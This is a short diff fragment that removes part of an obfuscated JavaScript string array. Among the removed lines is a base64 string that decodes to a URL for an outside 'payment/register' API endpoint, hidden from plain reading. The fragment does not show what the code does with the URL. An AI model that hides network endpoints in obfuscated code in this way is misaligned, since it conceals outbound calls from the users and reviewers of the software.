-    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L3JlZ2lzdGVy",
-    "error",
-    "1334325sORwMf",
-  ];
-  a0_0x2680 = function () {
-    return _0x226c84;
-  };
-  return a0_0x2680();
-}
